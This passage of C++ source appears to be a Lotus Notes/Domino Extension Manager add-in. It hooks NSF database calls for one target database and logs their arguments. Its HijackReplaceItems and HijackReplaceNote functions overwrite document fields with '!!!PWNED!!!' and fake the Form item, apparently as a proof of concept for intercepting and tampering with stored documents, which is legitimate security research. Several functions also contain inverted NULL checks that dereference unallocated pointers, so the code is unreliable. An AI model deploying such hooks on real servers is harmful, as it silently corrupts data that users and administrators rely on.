					memcpy(&(oid->Note), &(unid->Note), sizeof(TIMEDATE));
					if (NULL != modTime)
						modTime = (TIMEDATE *)malloc(sizeof(TIMEDATE));
					OSCurrentTIMEDATE(modTime);
					DWORD cls = NOTE_CLASS_DOCUMENT;
					if (NULL != nClass)
						nClass = (WORD *)malloc(sizeof(WORD));
					memcpy(nClass, &cls, sizeof(WORD));
					/*OSMemAlloc(0, (DWORD) sizeof(DHANDLE), &hNote);
					NSFNoteCreate(hDb, &hNote);
					NSFNoteGetInfo(hNote, _NOTE_ID, &couchID);
					if (NULL == oid)
						oid = (ORIGINATORID *)malloc(sizeof(ORIGINATORID));
					NSFNoteGetInfo(hNote, _NOTE_OID, oid);
					memcpy(&(oid->File), &(unid->File), sizeof(DBID));
					memcpy(&(oid->Note), &(unid->Note), sizeof(TIMEDATE));
					NSFNoteSetInfo(hNote, _NOTE_OID, oid);
					if (NULL == modTime)
						modTime = (TIMEDATE *)malloc(sizeof(TIMEDATE));
					NSFNoteGetInfo(hNote, _NOTE_MODIFIED, modTime);
					DWORD cls = NOTE_CLASS_DOCUMENT;
					if (NULL == nClass)
						nClass = (WORD *)malloc(sizeof(WORD));
					//memcpy(nClass, &cls, sizeof(WORD));
					NSFNoteSetInfo(hNote, _NOTE_CLASS, &cls);
					NSFNoteGetInfo(hNote, _NOTE_CLASS, nClass);*/
					/*STATUS stat = (STATUS)NOERROR;
					memcpy(&(record->Status), &stat, sizeof(STATUS));*/
					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					if (NULL != unid) {
						TIMEDATE * nt = &(unid->Note);
						TIMEDATE * f = &(unid->File);
						sprintf(out, "UNID: OF - 0x%08lx:0x%08lx; ON - 0x%08lx:0x%08lx\n", f->Innards[0], f->Innards[1], nt->Innards[0], nt->Innards[1]);
						LogLine(out);
					}
					else LogLine("UNID is NULL\n");
					if (NULL != noteid) {
						sprintf(out, "Note ID: %X\n", *noteid);
						LogLine(out);
					}
					else LogLine("Note ID is NULL\n");
					if (NULL != oid) {
						sprintf(out, "Originator ID: OF - 0x%08lx:0x%08lx; ON - 0x%08lx:0x%08lx\n, S - %d, ST - 0x%08lx:0x%08lx\n", (&(oid->File))->Innards[0], (&(oid->File))->Innards[1], (&(oid->Note))->Innards[0], (&(oid->Note))->Innards[1], oid->Sequence, (&(oid->SequenceTime))->Innards[0], (&(oid->SequenceTime))->Innards[1]);
						LogLine(out);
					}
					else LogLine("Originator ID is NULL\n");
					if (NULL != modTime) {
						sprintf(out, "Mod Time: 0x%08lx:0x%08lx\n", modTime->Innards[0], modTime->Innards[1]);
						LogLine(out);
					}
					else LogLine("modTime is NULL\n");
					if (NULL != nClass) {
						sprintf(out, "Note Class: %X\n", *nClass);
						LogLine(out);
					}
					else LogLine("Note Class is NULL\n");
					STATUS status = record->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
				}

				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in Ext.\n");
		}

		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	STATUS LNPUBLIC ProcessReadDbObject(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		int matchDB;
		VARARG_PTR ap;
		DBHANDLE hDb;
		DWORD objid, offset, length;
		DHANDLE far * hObj;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];

		try {
			// get function args
			ap = record->Ap;

			hDb = (DBHANDLE)VARARG_GET(ap, DBHANDLE);
			objid = (DWORD)VARARG_GET(ap, DWORD);
			offset = (DWORD)VARARG_GET(ap, DWORD);
			length = (DWORD)VARARG_GET(ap, DWORD);
			hObj = (DHANDLE *)VARARG_GET(ap, DHANDLE *);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (matchDB == 0) {
				/*gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("Intercepted before Db Read Object.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "Object ID: %X\n", objid);
					LogLine(out);
					sprintf(out, "Offset: %X\n", offset);
					LogLine(out);
					sprintf(out, "Length: %X\n", length);
					LogLine(out);
					if (NULL != hObj) {
						sprintf(out, "Object handle: %X\n", *hObj);
						LogLine(out);
					}
					else LogLine("Object handle is NULL\n");
				}
				else {
					LogLine("Intercepted after Db Read Object.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "Object ID: %X\n", objid);
					LogLine(out);
					sprintf(out, "Offset: %X\n", offset);
					LogLine(out);
					sprintf(out, "Length: %X\n", length);
					LogLine(out);
					if (NULL != hObj) {
						sprintf(out, "Object handle: %X\n", *hObj);
						LogLine(out);
					}
					else LogLine("Object handle is NULL\n");

					STATUS status = record->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
				}

				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}*/
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in Ext.\n");
		}

		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	STATUS LNPUBLIC ProcessDbGetObjectSize(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		int matchDB;
		VARARG_PTR ap;
		DBHANDLE hDb;
		DWORD objid, *size;
		WORD type, *oClass, *priv;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];

		try {
			// get function args
			ap = record->Ap;

			hDb = (DBHANDLE)VARARG_GET(ap, DBHANDLE);
			objid = (DWORD)VARARG_GET(ap, DWORD);
			type = (WORD)VARARG_GET(ap, WORD);
			size = (DWORD *)VARARG_GET(ap, DWORD *);
			oClass = (WORD *)VARARG_GET(ap, WORD *);
			priv = (WORD *)VARARG_GET(ap, WORD *);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (matchDB == 0) {
				gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("Intercepted before Db Get Object Size.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "Object ID: %X\n", objid);
					LogLine(out);
					sprintf(out, "Type: %X\n", type);
					LogLine(out);
					if (NULL != size) {
						sprintf(out, "Size: %X\n", *size);
						LogLine(out);
					}
					else LogLine("Size is NULL\n");
					if (NULL != oClass) {
						sprintf(out, "Object class: %X\n", *oClass);
						LogLine(out);
					}
					else LogLine("Object class is NULL\n");
					if (NULL != priv) {
						sprintf(out, "Object privileges: %X\n", *priv);
						LogLine(out);
					}
					else LogLine("Object privileges is NULL\n");
				}
				else {
					LogLine("Intercepted after Db Read Object.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "Object ID: %X\n", objid);
					LogLine(out);
					sprintf(out, "Type: %X\n", type);
					LogLine(out);
					if (NULL != size) {
						sprintf(out, "Size: %X\n", *size);
						LogLine(out);
					}
					else LogLine("Size is NULL\n");
					if (NULL != oClass) {
						sprintf(out, "Object class: %X\n", *oClass);
						LogLine(out);
					}
					else LogLine("Object class is NULL\n");
					if (NULL != priv) {
						sprintf(out, "Object privileges: %X\n", *priv);
						LogLine(out);
					}
					else LogLine("Object privileges is NULL\n");

					STATUS status = record->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
				}

				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in Ext.\n");
		}

		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	STATUS LNPUBLIC ProcessDbGetNoteInfo(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		int matchDB;
		VARARG_PTR ap;
		DBHANDLE hDb;
		NOTEID noteid;
		OID far * oid;
		TIMEDATE far * mod;
		WORD far * nClass;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];

		try {
			// get function args
			ap = record->Ap;

			hDb = (DBHANDLE)VARARG_GET(ap, DBHANDLE);
			noteid = (NOTEID)VARARG_GET(ap, NOTEID);
			oid = (OID far *)VARARG_GET(ap, OID far *);
			mod = (TIMEDATE far *)VARARG_GET(ap, TIMEDATE far *);
			nClass = (WORD far *)VARARG_GET(ap, WORD far *);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (matchDB == 0) {
				gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("Intercepted before Db Get Note Info.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "Note ID: %X\n", noteid);
					LogLine(out);
					if (NULL != oid) {
						sprintf(out, "Originator ID: OF - 0x%08lx:0x%08lx; ON - 0x%08lx:0x%08lx\n, S - %d, ST - 0x%08lx:0x%08lx\n", (&(oid->File))->Innards[0], (&(oid->File))->Innards[1], (&(oid->Note))->Innards[0], (&(oid->Note))->Innards[1], oid->Sequence, (&(oid->SequenceTime))->Innards[0], (&(oid->SequenceTime))->Innards[1]);
						LogLine(out);
					}
					else LogLine("Originator ID is NULL\n");
					if (NULL != mod) {
						sprintf(out, "Mod Time: 0x%08lx:0x%08lx\n", mod->Innards[0], mod->Innards[1]);
						LogLine(out);
					}
					else LogLine("Mod Time is NULL\n");
					if (NULL != nClass) {
						sprintf(out, "Note Class: %X\n", *nClass);
						LogLine(out);
					}
					else LogLine("Note Class is NULL\n");
				}
				else {
					LogLine("Intercepted after Db Get Note Info.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "Note ID: %X\n", noteid);
					LogLine(out);
					if (NULL != oid) {
						sprintf(out, "Originator ID: OF - 0x%08lx:0x%08lx; ON - 0x%08lx:0x%08lx\n, S - %d, ST - 0x%08lx:0x%08lx\n", (&(oid->File))->Innards[0], (&(oid->File))->Innards[1], (&(oid->Note))->Innards[0], (&(oid->Note))->Innards[1], oid->Sequence, (&(oid->SequenceTime))->Innards[0], (&(oid->SequenceTime))->Innards[1]);
						LogLine(out);
					}
					else LogLine("Originator ID is NULL\n");
					if (NULL != mod) {
						sprintf(out, "Mod Time: 0x%08lx:0x%08lx\n", mod->Innards[0], mod->Innards[1]);
						LogLine(out);
					}
					else LogLine("Mod Time is NULL\n");
					if (NULL != nClass) {
						sprintf(out, "Note Class: %X\n", *nClass);
						LogLine(out);
					}
					else LogLine("Note Class is NULL\n");

					STATUS status = record->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
				}

				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in Ext.\n");
		}

		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	STATUS LNPUBLIC ProcessNoteGetInfo(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		VARARG_PTR ap;
		NOTEHANDLE hNote;
		DBHANDLE far db;
		WORD member;
		void far * ptr;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];
		int matchDB;

		try {
			// get function args
			ap = record->Ap;

			hNote = (NOTEHANDLE)VARARG_GET(ap, NOTEHANDLE);
			member = (WORD)VARARG_GET(ap, WORD);
			ptr = (void far *)VARARG_GET(ap, void far *);

			NSFNoteGetInfo(hNote, _NOTE_DB, &db);
			NSFDbPathGet(db, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (matchDB == 0) {
				/*gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("Intercepted before Note Get Info.\n");

					LogLine("Info: \n");
					sprintf(out, "Note Handle: %X\n", hNote);
					LogLine(out);
					sprintf(out, "Member: %d\n", member);
					LogLine(out);
					if (NULL != ptr) {
						sprintf(out, "Pointer: %p\n", ptr);
						LogLine(out);
					}
					else LogLine("Pointer is NULL\n");
				}
				else {
					LogLine("Intercepted after Note Get Info.\n");

					LogLine("Info: \n");
					sprintf(out, "Note Handle: %X\n", hNote);
					LogLine(out);
					sprintf(out, "Member: %d\n", member);
					LogLine(out);
					if (NULL != ptr) {
						sprintf(out, "Pointer: %p\n", ptr);
						LogLine(out);
					}
					else LogLine("Pointer is NULL\n");

					STATUS status = record->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
				}

				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}*/
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in Ext.\n");
		}

		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	void CleanUp(void) {
		gHooksRegistered = FALSE;
	}

	void LogLine(char *line)
	{
		if (gLogStream) {
			fwrite(line, strlen(line), 1, gLogStream);
			if (ferror(gLogStream)) {
				fclose(gLogStream);
				gLogStream = (FILE *)0;
			}
		}
	}

	STATUS RegisterEntry() {
		STATUS error = NOERROR;
		char out[MAX_PATH + 100];

		for (int i = 0; HookTable[i].varName != NULL; i++) {
			error = EMRegister(HookTable[i].extMgrFlag, EM_REG_BEFORE | EM_REG_AFTER, (EMHANDLER)ProcessEM, gRecursionID, &(HookTable[i].EMHandle));

			if (error) {
				sprintf(out, "EMRegister Failed on %s\n", HookTable[i].varName);
				LogLine(out);
			}
		}

		return error;
	}

	STATUS DeregisterEntry() {
		STATUS error = NOERROR;
		char out[MAX_PATH + 100];

		gLogStream = fopen(LogFile, "a+");

		for (int i = 0; HookTable[i].varName != NULL; i++) {
			error = EMDeregister(HookTable[i].EMHandle);

			if (error) {
				sprintf(out, "EMDeregister Failed on %s\n", HookTable[i].varName);
				LogLine(out);
			}
		}

		return error;
	}

	/*STATUS RegisterEntry()
	{
		STATUS error = NOERROR;

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Note Open.\n");

		error = EMRegister(EM_NSFNOTEOPEN,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gNoteOpenHandlerProc,
			gRecursionID,
			&hHandler);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Note Open by UNID.\n");

		error = EMRegister(EM_NSFNOTEOPENBYUNID,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gNoteOpenUNIDHandlerProc,
			gRecursionID,
			&hHandlerUNID);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Note Open Ext.\n");

		error = EMRegister(EM_NSFNOTEOPENEXTENDED,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gNoteOpenExtHandlerProc,
			gRecursionID,
			&hHandlerExt);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Db Get Note Info By UNID.\n");

		error = EMRegister(EM_NSFDBGETNOTEINFOBYUNID,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gDbGetNoteInfoByUnidProc,
			gRecursionID,
			&hHandlerDbGetNoteInfoByUnid);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Db Read Object.\n");

		error = EMRegister(EM_NSFDBREADOBJECT,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gDbReadObjectProc,
			gRecursionID,
			&hHandlerDbReadObject);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Db Get Object Size.\n");

		error = EMRegister(EM_NSFDBGETOBJECTSIZE,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gDbGetObjectSizeProc,
			gRecursionID,
			&hHandlerDbGetObjectSize);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Db Get Note Info.\n");

		error = EMRegister(EM_NSFDBGETNOTEINFO,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gDbGetNoteInfoProc,
			gRecursionID,
			&hHandlerDbGetNoteInfo);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");
		LogLine("Registering entry for Note Get Info.\n");

		error = EMRegister(EM_NSFNOTEGETINFO,
			EM_REG_BEFORE | EM_REG_AFTER,
			(EMHANDLER)gNoteGetInfoProc,
			gRecursionID,
			&hHandlerNoteGetInfo);

		if (error) {
			LogLine("EMRegister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		return error;
	}

	STATUS DeregisterEntry()
	{
		STATUS error = NOERROR;

		gLogStream = fopen(LogFile, "a+");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Note Open.\n");

		error = EMDeregister(hHandler);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Note Open by UNID.\n");

		error = EMDeregister(hHandlerUNID);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Note Open Ext.\n");

		error = EMDeregister(hHandlerExt);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Db Get Note Info by UNID.\n");

		error = EMDeregister(hHandlerDbGetNoteInfoByUnid);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Db Read Object.\n");

		error = EMDeregister(hHandlerDbReadObject);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Db Get Object Size.\n");

		error = EMDeregister(hHandlerDbGetObjectSize);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Db Get Note Info.\n");

		error = EMDeregister(hHandlerDbGetNoteInfo);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");

		LogLine("-------------------------------------------------\n");

		LogLine("Deregistering entry for Note Get Info.\n");

		error = EMDeregister(hHandlerNoteGetInfo);

		if (error) {
			LogLine("EMDregister Failed\n");
			if (gLogStream) fclose(gLogStream);
			gLogStream = (FILE *)0;
			return error;
		}

		LogLine("-------------------------------------------------\n");
		fclose(gLogStream);

		return(error);
	}*/

	int indexOfNoteID(NOTEID id) {
		for (int i = 0; i < 3; i++) {
			if (id == targetIDs[i])
				return i;
		}
		return -1;
	}

	int indexOfNoteUNID(UNID * unid) {
		TIMEDATE * dt = &(unid->Note),
			* dtin;
		TIMEDATE * f = &(unid->File),
			* fin;
		for (int i = 0; i < 3; i++) {
			dtin = &((&targetUNIDs[i])->Note);
			fin = &((&targetUNIDs[i])->File);
			BOOL equals = ((dt->Innards[0]) == (dtin->Innards[0])) && ((dt->Innards[1]) == (dtin->Innards[1])) && ((f->Innards[0]) == (fin->Innards[0])) && ((f->Innards[1]) == (fin->Innards[1]));
			if (equals)
				return i;
		}
		return -1;
	}

	void HijackReplaceItems(NOTEHANDLE hNote) {
		int err = 0;
		char far namfield1[] = "Field_1";
		char far namfield2[] = "Field_2";
		char far namfield3[] = "Field_3";
		char far replacement[] = "!!!PWNED!!!", far lmbcsrepl[300];
		void far * old_field, far *new_field, far *new_value;
		BLOCKID far value, far item;
		WORD far type;
		DWORD far old_value_len, far new_value_len;
		char out[MAX_PATH + 50];

		OSTranslate(OS_TRANSLATE_NATIVE_TO_LMBCS, replacement, strlen(replacement), lmbcsrepl, sizeof(lmbcsrepl));
		// Field_1
		err = NSFItemInfo(hNote, namfield1, strlen(namfield1), &item, &type, &value, &old_value_len);
		sprintf(out, "Field name: \"%s\" type 0x%04x, len 0x%08lx\n", namfield1, type, old_value_len);
		switch (type) {
		case TYPE_TEXT_LIST:
			LogLine("It's a TEXT_LIST\n");
			err = NSFItemCreateTextList(hNote, namfield1, lmbcsrepl, strlen(lmbcsrepl) + 1);
			if (err != NOERROR) {
				switch (err) {
				case ERR_MEMORY:
					LogLine("Error: ERR_MEMORY\n");
					break;
				case ERR_SEGMENT_TOO_BIG:
					LogLine("Error: ERR_SEGMENT_TOO_BIG\n");
					break;
				default:
					sprintf(out, "Error: Other error # %d\n", err);
					LogLine(out);
					break;
				}
			}
			LogLine("Replaced value\n");
			break;
		case TYPE_TEXT:
			LogLine("It's a TEXT\n");
			break;
		}
		/*LogLine(out);
		new_value_len = strlen(lmbcsrepl) + 1 + sizeof(WORD);
		if (!(err)) {
			new_value = malloc(new_value_len);
			old_field = OSLockBlock(char, value);
			LogLine("Old value item value: ");
			strcpy(out, (char*)old_field);
			LogLine(out);
			LogLine("\n");
			if (old_field != NULL) {
				memcpy(new_value, old_field, (WORD) new_value_len);
				LogLine("Copied value of existing field\n");
			}
			else {
				free(new_value);
				return;
			}
			OSUnlockBlock(value);
			//sprintf(out, "Copied over the new value: %s", *((char*)new_value));
			//LogLine(out);
			err = NSFItemRealloc(item, &value, new_value_len);
			new_field = OSLockBlock(char, value);
			if (new_field != NULL) {
				memcpy(new_field, new_value, (WORD) new_value_len);
			}
			OSUnlockBlock(value);
		}*/
	}

	void HijackReplaceNote(NOTEHANDLE hNote) {
		int err = 0;
		char far formfield[] = "Form";
		char far namfield1[] = "Field_1";
		char far namfield2[] = "Field_2";
		char far namfield3[] = "Field_3";
		char far replacement[] = "!!!PWNED!!!", form[] = "test", far lmbcsrepl[300], far lmbcsform[300];
		void far * old_field, far *new_field, far *new_value;
		BLOCKID far value, far item;
		WORD far type;
		DWORD far old_value_len, far new_value_len;
		char out[MAX_PATH + 50];

		OSTranslate(OS_TRANSLATE_NATIVE_TO_LMBCS, replacement, strlen(replacement), lmbcsrepl, sizeof(lmbcsrepl));
		OSTranslate(OS_TRANSLATE_NATIVE_TO_LMBCS, form, strlen(form), lmbcsform, sizeof(lmbcsform));
		LogLine("Faking Form field...\n");
		err = NSFItemCreateTextList(hNote, formfield, lmbcsform, strlen(lmbcsform) + 1);
		if (err != NOERROR) {
			sprintf(out, "FAKING ITEM \"Form\" FAILED: %d - ", err);
			LogLine(out);
			OSLoadString(NULLHANDLE, ERR(err), out, sizeof(out) - 1);
			LogLine(out);
			LogLine("\n");
		}
		LogLine("Faking Field_1 field...\n");
		err = NSFItemCreateTextList(hNote, namfield1, lmbcsrepl, strlen(lmbcsrepl));
		if (err != NOERROR) {
			sprintf(out, "FAKING ITEM \"Field_1\" FAILED: %d - ", err);
			LogLine(out);
			OSLoadString(NULLHANDLE, ERR(err), out, sizeof(out) - 1);
			LogLine(out);
			LogLine("\n");
		}
		LogLine("Faking Field_2 field...\n");
		err = NSFItemCreateTextList(hNote, namfield2, lmbcsrepl, strlen(lmbcsrepl));
		if (err != NOERROR) {
			sprintf(out, "FAKING ITEM \"Field_2\" FAILED: %d - ", err);
			LogLine(out);
			OSLoadString(NULLHANDLE, ERR(err), out, sizeof(out) - 1);
			LogLine(out);
			LogLine("\n");
		}
		LogLine("Faking Field_3 field...\n");
		err = NSFItemCreateTextList(hNote, namfield3, lmbcsrepl, strlen(lmbcsrepl));
		if (err != NOERROR) {
			sprintf(out, "FAKING ITEM \"Field_3\" FAILED: %d - ", err);
			LogLine(out);
			OSLoadString(NULLHANDLE, ERR(err), out, sizeof(out) - 1);
			LogLine(out);
			LogLine("\n");
		}
	}

	BOOL isCouchUNID(UNID far * unid) {
		TIMEDATE * nt = &(unid->Note),
			*ntin = &((&couchUNID)->Note);
		TIMEDATE * f = &(unid->File),
			*fin = &((&couchUNID)->File);
		BOOL result = ((nt->Innards[0]) == (ntin->Innards[0])) && ((nt->Innards[1]) == (ntin->Innards[1])) && ((f->Innards[0]) == (fin->Innards[0])) && ((f->Innards[1]) == (fin->Innards[1]));
		return result;
	}

	BOOL isCouchID(NOTEID * id) {
		return *id == couchID;
	}

	void addCollection(HCOLLECTION coll) {
		if (myColl == NULL) {
			myColl = (HCOLLECTION *)malloc(sizeof(HCOLLECTION));
			myCount = 0;
		} 
		else 
			myColl = (HCOLLECTION *)realloc(myColl, (myCount + 1) * sizeof(HCOLLECTION));
		memcpy(myColl + myCount, &coll, sizeof(HCOLLECTION));
		myCount++;
	}

	void discardCollection(HCOLLECTION coll) {
		if (isInList(coll) != 0)
			return;
		if (myCount == 1) {
			myCount = 0;
			free(myColl);
			myColl = NULL;
			return;
		}
		HCOLLECTION * newColl = (HCOLLECTION *)malloc((myCount - 1) * sizeof(HCOLLECTION));
		BOOL equals;
		unsigned long newCount = 0;
		for (int i = 0; i < myCount; i++) {
			equals = memcmp(myColl + i, &coll, sizeof(HCOLLECTION));
			if (equals != 0) {
				memcpy(newColl + newCount, myColl + i, sizeof(HCOLLECTION));
				newCount++;
			}
		}
		//myColl = (HCOLLECTION *)realloc(newColl, newCount * sizeof(HCOLLECTION));
		free(myColl);
		myColl = newColl;
		myCount--;
	}

	BOOL isInList(HCOLLECTION coll) {
		if (NULL == myColl)
			return -1;
		BOOL equals;
		for (int i = 0; i < myCount; i++) {
			equals = memcmp(myColl + i, &coll, sizeof(HCOLLECTION));
			if (equals == 0)
				return equals;
		}
		return equals;
	}
